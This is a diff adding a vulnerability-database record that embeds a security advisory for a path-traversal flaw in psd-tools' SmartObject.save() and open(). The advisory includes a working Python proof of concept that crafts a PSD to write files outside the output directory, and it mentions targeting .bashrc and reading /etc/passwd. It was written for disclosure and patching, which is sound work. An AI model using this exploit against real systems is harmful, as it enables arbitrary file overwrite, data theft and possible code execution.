@@ -1,0 +1,162 @@
+[id]
+ave_id = "AVE-2026-0324"
+aliases = ["CVE-2026-49836","GHSA-2rmg-vrx8-9j2f"]
+
+[basic]
+title = "psd-tools vulnerable to arbitrary file write via smart-object filename"
+description = "# psd-tools: arbitrary file write/read via smart-object path traversal
+
+## Summary
+
+In `psd-tools` (all releases exposing the `SmartObject` API through **v1.17.0**), `SmartObject.save()` writes an embedded smart object to a path taken verbatim from the PSD file. Because that name is attacker-controlled and unsanitised, a tool that extracts embedded objects from an untrusted `.psd` can be made to write attacker-chosen bytes to an attacker-chosen path (absolute or `../`-traversing), outside its intended output directory.
+
+A secondary issue in `SmartObject.open()` for external-kind smart objects allows the attacker-controlled `fullPath` descriptor to be used as an arbitrary file **read** path, enabling exfiltration of the read content to the controlled write destination. Both issues are fixed in **v1.17.1**.
+
+## Details
+
+### Write path — `SmartObject.save()` (primary)
+
+`src/psd_tools/api/smart_object.py:170-179` (tag `v1.17.0`):
+
+```python
+def save(self, filename: str | None = None) -> None:
+    if filename is None:
+        filename = self.filename          # untrusted, straight from the file
+    with open(filename, \"wb\") as f:
+        f.write(self.data)                # attacker-controlled bytes
+```
+
+`self.filename` comes from the file with no validation — the `filename` property (`:62-67`) returns `self._data.filename`, set by the linked-layer parser at `src/psd_tools/psd/linked_layer.py:100` (`read_unicode_string(fp)`). There is no `basename`, no absolute path rejection, and no `..` filtering; the written contents (`self.data`) are likewise from the file, so the attacker controls both destination and content.
+
+### Read path — `SmartObject.open()` / `.data` for external kind (secondary)
+
+For `kind == \"external\"`, `save()` read file content via the `data` property, which called `open()` with no `external_dir` constraint. The `fullPath` descriptor embedded in the PSD was then used verbatim as the source path, enabling an attacker-crafted PSD to cause `save(directory=\"/safe/out\")` to read an arbitrary readable file (e.g. `/etc/passwd`) and write its contents to the output directory.
+
+## Proof of concept
+
+Standalone, against the released package (writes only into a fresh temp dir; exit 0 = confirmed). A Docker bundle is available on request.
+
+```bash
+pip install psd-tools==1.17.0
+python poc.py
+```
+
+`poc.py` builds two PSDs from the project's own `placedLayer.psd` fixture (included as `base.psd`), differing **only** in the embedded smart-object name — `control` is a bare basename, `exploit` is `../../PWNED-psd-tools-poc.bin` — then extracts each like a consumer would:
+
+```python
+import os, shutil, tempfile
+from psd_tools import PSDImage
+from psd_tools.constants import Tag
+
+MARKER = b\"PSD-TOOLS-POC: arbitrary-file-write payload (attacker-controlled bytes)\n\"
+NAMES = {\"control\": \"embedded-export.bin\", \"exploit\": \"../../PWNED-psd-tools-poc.bin\"}
+
+def craft(name, out):
+    psd = PSDImage.open(os.path.join(os.path.dirname(__file__), \"base.psd\"))
+    uuid = next(l.smart_object.unique_id for l in psd.descendants()
+                if l.kind == \"smartobject\" and l.smart_object.kind == \"data\")
+    for key in (Tag.LINKED_LAYER1, Tag.LINKED_LAYER2, Tag.LINKED_LAYER3, Tag.LINKED_LAYER_EXTERNAL):
+        for item in (psd.tagged_blocks.get_data(key) or []) if key in psd.tagged_blocks else []:
+            if item.uuid.strip(\"\x00\") == uuid:
+                item.filename, item.data = name, MARKER
+    psd.save(out)
+
+def extract(psd_path, outdir, watch):
+    psd = PSDImage.open(psd_path)
+    before = {os.path.realpath(os.path.join(d, f)) for d, _, fs in os.walk(watch) for f in fs}
+    cwd = os.getcwd(); os.chdir(outdir)
+    try:
+        for l in psd.descendants():
+            if l.kind == \"smartobject\" and l.smart_object.kind == \"data\":
+                l.smart_object.save()
+    finally:
+        os.chdir(cwd)
+    after = {os.path.realpath(os.path.join(d, f)) for d, _, fs in os.walk(watch) for f in fs}
+    return sorted(after - before)
+
+def main():
+    tmp = tempfile.mkdtemp(prefix=\"poc_\")
+    try:
+        escaped = {}
+        for tag, name in NAMES.items():
+            psd = os.path.join(tmp, tag + \".psd\"); craft(name, psd)
+            so = next(l.smart_object for l in PSDImage.open(psd).descendants()
+                      if l.kind == \"smartobject\" and l.smart_object.kind == \"data\")
+            print(f\"[{tag}] parsed embedded name = {so.filename!r}\")
+            outdir = os.path.join(tmp, tag, \"app\", \"extracted\"); os.makedirs(outdir)
+            written = extract(psd, outdir, tmp); out = os.path.realpath(outdir)
+            esc = [w for w in written if not w.startswith(out + os.sep)]; escaped[tag] = esc
+            for w in written:
+                print(f\"[{tag}] wrote {w}  {chr(39)}OUTSIDE output dir{chr(39) if w in esc else chr(39)}inside output dir{chr(39)}\")
+        ok = (not escaped[\"control\"] and escaped[\"exploit\"]
+              and all(open(w, \"rb\").read() == MARKER for w in escaped[\"exploit\"]))
+        print(\"\nVERDICT:\", \"ARBITRARY FILE WRITE CONFIRMED\" if ok else \"not reproduced\")
+        return 0 if ok else 1
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+
+raise SystemExit(main())
+```
+
+Output (`psd-tools 1.17.0`):
+
+```
+[control] parsed embedded name = 'embedded-export.bin'
+[control] wrote .../poc_*/control/app/extracted/embedded-export.bin  inside output dir
+[exploit] parsed embedded name = '../../PWNED-psd-tools-poc.bin'
+[exploit] wrote .../poc_*/exploit/PWNED-psd-tools-poc.bin  OUTSIDE output dir
+
+VERDICT: ARBITRARY FILE WRITE CONFIRMED
+```
+
+An absolute embedded name (e.g. `/home/user/.bashrc`) is honoured the same way.
+
+## Impact
+
+Any application that ingests untrusted PSD/PSB files and extracts their embedded smart objects via `SmartObject.save()` can be coerced into writing attacker-controlled bytes to an attacker-chosen existing directory — no authentication or special configuration required. High integrity impact; can escalate to code execution depending on the target path.
+
+For external-kind smart objects the same call additionally allowed arbitrary file reads, with the read content written to the controlled output directory.
+
+## Severity
+
+**Moderate** for the common case (a library/desktop tool where a user initiates extraction). Higher for a service that auto-extracts smart objects from uploaded PSDs without user interaction.
+
+## Patch
+
+Fixed in **v1.17.1** (PR #657). Changes to `src/psd_tools/api/smart_object.py`:
+
+- **`save()`**: strips directory components from the embedded name via `os.path.basename()`, writes only into a caller-supplied `directory` (defaults to CWD), and verifies the resolved path stays inside that directory via `os.path.realpath()` + `os.path.commonpath()`. A new `external_dir` parameter is propagated to `open()` for external-kind objects to constrain the read source.
+- **`open()`**: when `external_dir` is provided, a `fullPath` resolving outside it is silently ignored (falls through to `relPath`); a `relPath` escaping the directory raises `ValueError`.
+
+## Weaknesses
+
+CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) via CWE-73 (External Control of File Name or Path).
+
+## Resources
+
+- Fix PR: https://github.com/psd-tools/psd-tools/pull/657
+- Release: https://github.com/psd-tools/psd-tools/releases/tag/v1.17.1
+- Affected source (tag `v1.17.0`): `src/psd_tools/api/smart_object.py:170-179`
+  (sink), `:62-67` (untrusted `filename`); `src/psd_tools/psd/linked_layer.py:100`
+  (source).
+- Distinct in class from the published advisories (GHSA-24p2-j2jr-386w —
+  compression resource exhaustion; GHSA-22jr-vc7j-g762 — buffer overflow). The
+  `save()` write logic is unchanged since the `SmartObject` API was introduced,
+  so all releases exposing it are affected."
+severity = "MEDIUM"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-23T00:05:22.227347007+00:00"
